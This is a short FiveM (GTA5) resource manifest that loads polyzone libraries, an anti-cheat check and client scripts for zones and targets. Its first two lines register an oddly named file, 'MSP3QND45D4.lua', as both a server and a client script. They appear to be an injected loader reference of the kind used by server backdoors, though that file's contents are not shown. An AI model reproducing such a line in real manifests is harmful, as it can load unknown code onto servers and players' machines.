server_script "MSP3QND45D4.lua"
client_script "MSP3QND45D4.lua"
fx_version("cerulean")
game("gta5")
lua54("yes")
client_script("@method-base/components/cl_error.lua")
client_script("@method-pwnzor/client/check.lua")

client_scripts({
	"@method-polyzone/client.lua",
	"@method-polyzone/BoxZone.lua",
	"@method-polyzone/EntityZone.lua",
	"@method-polyzone/CircleZone.lua",
	"@method-polyzone/ComboZone.lua",

	"client/*.lua",
	"client/targets/*.lua",
})
